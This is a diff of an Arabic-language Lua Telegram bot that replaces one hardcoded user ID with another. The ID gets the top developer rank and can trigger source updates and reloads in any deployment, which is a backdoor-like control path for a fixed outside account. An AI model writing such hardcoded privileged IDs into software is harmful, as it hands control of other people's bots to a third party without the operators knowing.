@@ -277,7 +277,7 @@ end
 return false 
 end 
 
-if msg.sender_user_id_ == 1634560089 or msg.sender_user_id_ == 60809019  then 
+if msg.sender_user_id_ == 1099083018 or msg.sender_user_id_ == 60809019  then 
 msg.TheRankCmd = 'مطور السورس'
 msg.TheRank = 'مطور السورس'
 msg.Rank = 1
@@ -594,19 +594,19 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="we" or msg.text=="حدث") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 00090 or msg.sender_user_id_ == 1634560089) then
+if (msg.text=="تحديث" or msg.text=="we" or msg.text=="حدث") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 00090 or msg.sender_user_id_ == 1099083018) then
 return sendMsg(msg.chat_id_,msg.id_," ابشر ",function(arg,data)
 Refresh_Start = true
 end)
 end 
-if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1634560089 or msg.sender_user_id_ == 1634560089) then
+if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1099083018 or msg.sender_user_id_ == 1099083018) then
 UpdateSource(msg)
 sendMsg(msg.chat_id_,msg.id_,'  Done Master   ',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
 end) 
 end
-if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 00090 or msg.sender_user_id_ == 1634560089) then
+if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 00090 or msg.sender_user_id_ == 1099083018) then
 sendMsg(msg.chat_id_,msg.id_,'- {* تــم أعـاده تشغيل البوت  *} .\n\n- { Bot is Reloaded » }',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
